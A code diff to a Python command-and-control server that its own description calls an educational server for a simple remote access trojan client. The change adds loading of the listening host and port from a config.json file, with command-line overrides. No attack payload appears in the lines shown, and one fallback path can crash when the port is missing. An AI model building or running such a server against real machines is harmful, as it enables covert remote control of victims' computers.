@@ -17,6 +17,7 @@ from __future__ import annotations
 
 import argparse
 import json
+import os
 import socket
 import threading
 from dataclasses import dataclass, field
@@ -267,27 +268,49 @@ Commands:
             print("Unknown command. Type `help` for a list of commands.")
 
 
+def load_config() -> JsonDict:
+    """
+    Load configuration from config.json in the same directory as this script,
+    if it exists. Returns an empty dict if it cannot be loaded.
+    """
+    path = os.path.join(os.path.dirname(__file__), "config.json")
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            return json.load(f)
+    except OSError:
+        return {}
+    except json.JSONDecodeError:
+        return {}
+
+
 def parse_args() -> argparse.Namespace:
     parser = argparse.ArgumentParser(
         description="Educational CNC server for the simple RAT client.",
     )
     parser.add_argument(
         "--host",
-        default="0.0.0.0",
-        help="Host/IP to bind the CNC server to (default: 0.0.0.0)",
+        help="Host/IP to bind the CNC server to (overrides config.json if provided)",
     )
     parser.add_argument(
         "--port",
         type=int,
-        default=9001,
-        help="TCP port to listen on (default: 9001)",
+        help="TCP port to listen on (overrides config.json if provided)",
     )
     return parser.parse_args()
 
 
 def main() -> None:
+    cfg = load_config()
+    server_cfg = cfg.get("server") if isinstance(cfg, dict) else {}
+
     args = parse_args()
-    server = CNCServer(args.host, args.port)
+
+    host = args.host or (server_cfg.get("host") if isinstance(server_cfg, dict) else None) or "0.0.0.0"
+    port = args.port or int(
+        (server_cfg.get("port") if isinstance(server_cfg, dict) else 9001)
+    )
+
+    server = CNCServer(host, port)
     server.start()
     run_cli(server)
 
